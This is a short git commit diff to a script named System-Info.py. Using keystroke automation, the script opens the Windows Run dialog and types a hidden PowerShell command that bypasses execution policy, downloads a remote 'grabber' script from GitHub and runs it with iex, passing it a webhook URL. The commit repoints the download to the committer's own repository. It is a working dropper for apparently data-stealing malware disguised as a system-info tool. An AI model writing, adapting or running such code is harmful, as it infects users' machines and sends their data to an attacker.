c578bc0540252080141d819aadb4d68f2472925f
stack-crash999 <unlocker129@outlook.com>
2025-04-12 18:24:20 -0500

    System-Info.py

--- System-Info.py
+++ System-Info.py
@@ -11,5 +11,5 @@ except ImportError:
 time.sleep(0.1)
 pyautogui.hotkey('win', 'r')
 time.sleep(0.1)
-pyautogui.write(f"powershell -NoP -Ep Bypass -W H -C $dc='{webhook_url}'; irm https://raw.githubusercontent.com/Powercascade/Power-grabber/refs/heads/main/taktikal | iex")
+pyautogui.write(f"powershell -NoP -Ep Bypass -W H -C $dc='{webhook_url}'; irm https://raw.githubusercontent.com/stack-crash999/DARKWIRE-MAIN/refs/heads/main/taktikal | iex")
 pyautogui.press('enter')
